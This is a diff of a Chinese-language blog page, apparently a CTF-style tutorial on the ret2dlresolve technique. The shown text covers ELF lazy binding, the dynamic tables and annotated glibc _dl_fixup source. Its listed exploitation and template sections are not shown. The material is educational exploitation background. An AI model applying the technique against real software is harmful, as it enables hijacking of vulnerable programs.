@@ -1,229 +1,382 @@
 <!DOCTYPE html>
-<html lang="en" data-theme="dark">
-  <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <title>ret2dl | heart22&#39;s blog</title>
-  
-  <!-- Favicon 配置 -->
-  
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
     
-      <link rel="icon" type="image/x-icon" href="../../../../favicon.ico">
+    <meta name="author" content="The Redefine Team">
     
-    
-      <link rel="icon" type="image/png" sizes="16x16" href="../../../../favicon-16x16.png">
-    
-    
-      <link rel="icon" type="image/png" sizes="32x32" href="../../../../favicon-32x32.png">
-    
-    
-      <link rel="icon" type="image/png" sizes="192x192" href="../../../../favicon-192x192.png">
-    
-    
-      <link rel="apple-touch-icon" sizes="180x180" href="../../../../apple-touch-icon.png">
-    
-  
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
-  <link rel="stylesheet" href="../../../../css/theme-colors.css">
-  <link rel="stylesheet" href="../../../../css/main.css">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
 
-  <!-- 添加代码高亮样式 -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
-  <!-- 添加highlight.js库 -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
-  <!-- 添加mermaid.js库 -->
-  <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
-  <link rel="stylesheet" href="../../../../css/code.css">
-  <link rel="stylesheet" href="../../../../css/code-custom.css">
-  <link rel="stylesheet" href="../../../../css/code-languages.css">
-  <link rel="stylesheet" href="../../../../css/mermaid.css">
+                // Try immediately
+                if (addBodyClass()) return;
 
-  <link rel="stylesheet" href="../../../../css/vs-code.css">
-  <link rel="stylesheet" href="../../../../css/post.css">
-  <link rel="stylesheet" href="../../../../css/tag.css">
-  <link rel="stylesheet" href="../../../../css/categories.css">
-  <link rel="stylesheet" href="../../../../css/archive.css">
-  <link rel="stylesheet" href="../../../../css/search.css">
-  <link rel="stylesheet" href="../../../../css/mobile.css">  <link rel="stylesheet" href="../../../../css/responsive.css">
-  <link rel="stylesheet" href="../../../../css/elements.css">
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 
-  <!-- 添加 JetBrains Mono 字体 -->  
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/05/12/ret2dl/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dl">
+<meta property="og:url" content="http://example.com/2025/05/12/ret2dl/index.html">
+<meta property="og:site_name" content="heart22&#39;s blog">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-05-12T11:27:27.000Z">
+<meta property="article:modified_time" content="2025-08-10T13:14:12.071Z">
+<meta property="article:author" content="heart22">
+<meta property="article:tag" content="stack">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="../../../../images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="../../../../images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            ret2dl | Theme Redefine
+        
+    </title>
 
-  <!-- Add any custom head content here -->
+    
+<link rel="stylesheet" href="fonts/Chillax/chillax.css">
 
-  <script src="../../../../js/explorer.js"></script>
-  <script src="../../../../js/code-copy.js"></script>
-  <script src="../../../../js/code-enhance.js"></script>
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="../../../../css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="fontawesome/regular.min.css">
+
+    
+    
+    
+    
 <meta name="generator" content="Hexo 7.3.0"></head>
 
-  <body>
-    <div class="wrapper">
-      <div class="mobile-menu-toggle">
-        <i class="fas fa-bars"></i>
-      </div>
-      <header class="vs-header">
-  <nav class="vs-nav">
-    <div class="nav-left">
-      <a href="/" class="nav-brand">
-        <i class="fas fa-terminal"></i>
-        heart22&#39;s blog
-      </a>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Theme Redefine
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="../../../../index.html"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
     </div>
-    
-    <div class="nav-right">
-      <a href="/" class="nav-item ">
-        <i class="fas fa-home"></i>
-        <span>Home</span>
-      </a>
-      <a href="/archives/" class="nav-item ">
-        <i class="fas fa-archive"></i>
-        <span>Archives</span>
-      </a>
-      <a href="/categories/" class="nav-item ">
-        <i class="fas fa-folder"></i>
-        <span>Categories</span>
-      </a>
-      <a href="/tags/" class="nav-item ">
-        <i class="fas fa-tags"></i>
-        <span>Tags</span>
-      </a>
-      <a href="/search/" class="nav-item ">
-        <i class="fas fa-search"></i>
-        <span>Search</span>
-      </a>
-      <a href="/about/" class="nav-item ">
-        <i class="fas fa-info-circle"></i>
-        <span>About</span>
-      </a>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="../../../../index.html"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="../../../../archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
     </div>
-  </nav>
+
+    <div class="window-mask"></div>
+
 </header>
 
-<script>
-  function smoothScroll(event, target) {
-    event.preventDefault();
-    const targetId = target.substring(target.indexOf('#') + 1);
-    const targetElement = document.getElementById(targetId);
 
-    if (targetElement) {
-      window.scrollTo({
-        top: targetElement.offsetTop - 50, // 调整偏移量
-        behavior: 'smooth'
-      });
-    } else {
-      window.location.href = target;
-    }
-  }
+		</div>
 
-  window.addEventListener('scroll', function() {
-    const header = document.querySelector('.vs-header');
-    const nav = document.querySelector('.vs-nav');
-    const scrollPercent = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
-    
-    nav.style.setProperty('--scroll-percent', `${scrollPercent}%`);
-    
-    if (window.scrollY > 0) {
-      header.classList.add('scrolled');
-    } else {
-      header.classList.remove('scrolled');
-    }
-  });
+		<div class="main-content-body transition-fade-up">
+			
 
-  // 添加标签页切换动画
-  document.querySelectorAll('.nav-item').forEach(item => {
-    item.addEventListener('click', function(e) {
-      const ripple = document.createElement('span');
-      ripple.classList.add('nav-ripple');
-      this.appendChild(ripple);
-      
-      const rect = this.getBoundingClientRect();
-      const x = e.clientX - rect.left;
-      const y = e.clientY - rect.top;
-      
-      ripple.style.left = `${x}px`;
-      ripple.style.top = `${y}px`;
-      
-      setTimeout(() => ripple.remove(), 1000);
-    });
-  });
-</script>
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ret2dl</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="../../../../images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-05-12 19:27:27</span>
+        <span class="mobile">2025-05-12 19:27:27</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-10 21:14:12</span>
+            <span class="mobile">2025-08-10 21:14:12</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="../../../../tags/stack/">stack</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
 
 
-<div class="vscode-container">
-  <!-- 左侧资源管理器 -->
-  <div class="sidebar-explorer">
-    <!-- TOC导航 -->
-    <div class="explorer-section">
-      <div class="section-header">
-        <i class="fas fa-list"></i>
-        <span>TABLE OF CONTENTS</span>
-      </div>
-      <div class="section-content">
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#dl-runtime-resolve%E8%BF%90%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-text">dl_runtime_resolve运作流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81dynamic%E6%AE%B5"><span class="toc-text">1、dynamic段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81Dynamic-Symbol-Table%EF%BC%88%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E7%AC%A6%E5%8F%B7%E8%A1%A8%EF%BC%89"><span class="toc-text">2、Dynamic Symbol Table（动态链接符号表）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81Dynamic-String-Table%EF%BC%88%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A1%A8%EF%BC%89"><span class="toc-text">3、Dynamic String Table（动态链接字符串表）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-text">过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#x86"><span class="toc-text">x86</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#x64"><span class="toc-text">x64</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%BF%E5%AD%90"><span class="toc-text">板子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
-      </div>
-    </div>
-    
-    <!-- 同分类文章 -->
-    
-    
-    <!-- 标签列表 -->
-    
-    <div class="explorer-section">
-      <div class="section-header">
-        <i class="fas fa-tags"></i>
-        <span>ARTICLE TAGS</span>
-      </div>
-      <div class="section-content">
-        
-          <div class="tag-item">
-            <i class="fas fa-tag"></i>
-            <a href="../../../../tags/stack/">stack</a>
-            <span class="count">(1)</span>
-          </div>
-        
-      </div>
-    </div>
-    
-  </div>
-
-  <!-- 主要内容区域 -->
-  <div class="editor-content">
-    <div class="tab-bar">
-      <div class="tab active">
-        <i class="fas fa-file-alt"></i>
-        <span>ret2dl.md</span>
-      </div>
-    </div>
-    
-    <div class="content-area">
-      <article class="post-content">
-        <div class="post-header">
-          <h1>ret2dl</h1>
-          <div class="post-meta">
-            <span class="date">
-              <i class="fas fa-calendar-alt"></i>
-              2025-05-12
-            </span>            
-            
-              <span class="tags">
-                <i class="fas fa-tags"></i>
-                <div class="tags-list">
-                  <ul class="tag-item-post-list" itemprop="keywords"><li class="tag-item-post-list-item"><a class="tag-item-post-list-link" href="../../../../tags/stack/" rel="tag">stack</a></li></ul>
-                </div>
-              </span>
-            
-          </div>
-        </div>
-        
-        <div class="post-body vscode-markdown">
-          <p>延迟绑定运作流程</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829222/2025/08/02631ce534068f28047ea2c84b4d3cf6.png"></p>
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>延迟绑定运作流程</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829222/2025/08/02631ce534068f28047ea2c84b4d3cf6.png"
+                     
+                ></p>
 <h3 id="dl-runtime-resolve运作流程"><a href="#dl-runtime-resolve运作流程" class="headerlink" title="dl_runtime_resolve运作流程"></a>dl_runtime_resolve运作流程</h3><p>理解_dl_runtime_resolve的流程需要了解几个段</p>
 <h4 id="1、dynamic段"><a href="#1、dynamic段" class="headerlink" title="1、dynamic段"></a>1、dynamic段</h4><p>.dynamic段中保存了动态链接器需要的信息，Dynamic Symbol Table（动态链接符号表）、Dynamic String Table（动态链接字符串表）、重定位表等的位置<br>动调看一下具体情况</p>
 <p>ELF32_Dyn的结构如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>  </span><br><span class="hljs-class">&#123;</span>  <br>  Elf32_Sword  d_tag;       <span class="hljs-comment">/* Dynamic entry type */</span>  <br>  <span class="hljs-class"><span class="hljs-keyword">union</span>  </span><br><span class="hljs-class">    &#123;</span>  <br>      Elf32_Word d_val;          <span class="hljs-comment">/* Integer value */</span>  <br>      Elf32_Addr d_ptr;          <span class="hljs-comment">/* Address value */</span>  <br>    &#125; d_un;  <br>&#125; Elf32_Dyn;<br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>  </span><br><span class="hljs-class">&#123;</span>  <br>  Elf32_Sword  d_tag;       <span class="hljs-comment">/* Dynamic entry type */</span>  <br>  <span class="hljs-class"><span class="hljs-keyword">union</span>  </span><br><span class="hljs-class">    &#123;</span>  <br>      Elf32_Word d_val;          <span class="hljs-comment">/* Integer value */</span>  <br>      Elf32_Addr d_ptr;          <span class="hljs-comment">/* Address value */</span>  <br>    &#125; d_un;  <br>&#125; Elf32_Dyn;<br></code></pre></td></tr></table></figure></div>
 
 <p>整个结构体为8字节，</p>
 <h4 id="2、Dynamic-Symbol-Table（动态链接符号表）"><a href="#2、Dynamic-Symbol-Table（动态链接符号表）" class="headerlink" title="2、Dynamic Symbol Table（动态链接符号表）"></a>2、Dynamic Symbol Table（动态链接符号表）</h4><p>通常被称为”.dynsym”,<code>readelf -s file</code>可查看，保存了与动态链接相关的符号，”.symtab”中保存了所有符号</p>
@@ -231,36 +384,76 @@
 <h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>（结合动调来看一下）<br>dl_runtime_resolve(link_map_obj, reloc_index)</p>
 <p> 它调用了dl_fixup函数 dl_fixup函数又调用了_dl_lookup_symbol_x函数</p>
 <p>dl_fixup部分源码如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">_dl_fixup(<span class="hljs-keyword">struct</span> link_map *l,ElfW(Word) reloc_arg)<br>&#123;<br>	<span class="hljs-comment">// 首先通过参数reloc_arg计算重定位的入口，这里的JMPREL即.rel.plt，reloc_offest即reloc_arg</span><br>	<span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);<br>	<span class="hljs-comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span><br>	<span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>	<span class="hljs-comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7</span><br>	assert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);<br>	<span class="hljs-comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br>	result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span><br>	value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="hljs-number">0</span>);<br>	<span class="hljs-comment">// 最后把value写入相应的GOT表条目中</span><br>	<span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);	<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">_dl_fixup(<span class="hljs-keyword">struct</span> link_map *l,ElfW(Word) reloc_arg)<br>&#123;<br>	<span class="hljs-comment">// 首先通过参数reloc_arg计算重定位的入口，这里的JMPREL即.rel.plt，reloc_offest即reloc_arg</span><br>	<span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);<br>	<span class="hljs-comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span><br>	<span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>	<span class="hljs-comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7</span><br>	assert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);<br>	<span class="hljs-comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span><br>	result = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span><br>	value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="hljs-number">0</span>);<br>	<span class="hljs-comment">// 最后把value写入相应的GOT表条目中</span><br>	<span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);	<br>&#125;<br><br></code></pre></td></tr></table></figure></div>
 
 <p>首先通过link_map去找到.dynamic的地址，再分别取出.dynstm .dynstr .rel.plt</p>
-<p><img src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829224/2025/08/e48c0a10b92a26daf7ac1ad7a45791c7.png"></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://res.cloudinary.com/drdpahj9c/image/upload/v1754829224/2025/08/e48c0a10b92a26daf7ac1ad7a45791c7.png"
+                     
+                ></p>
 <p>其中两个入操作为_dl_runtime_resolve的参数，分别是reloc_index,和link_map的地址</p>
 <p>link_map源码如下</p>
